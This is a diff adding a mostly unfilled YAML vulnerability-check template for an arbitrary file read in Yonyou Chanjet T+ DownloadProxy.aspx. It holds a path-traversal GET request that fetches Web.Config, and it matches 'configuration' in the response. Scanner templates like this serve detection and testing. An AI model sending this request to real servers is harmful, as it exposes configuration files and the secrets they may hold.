@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 用友畅捷通T+ DownloadProxy.aspx 任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
+  headers:
+response1:
+  headers:
+  body: configuration
+  code:
+requests2:
+response2:
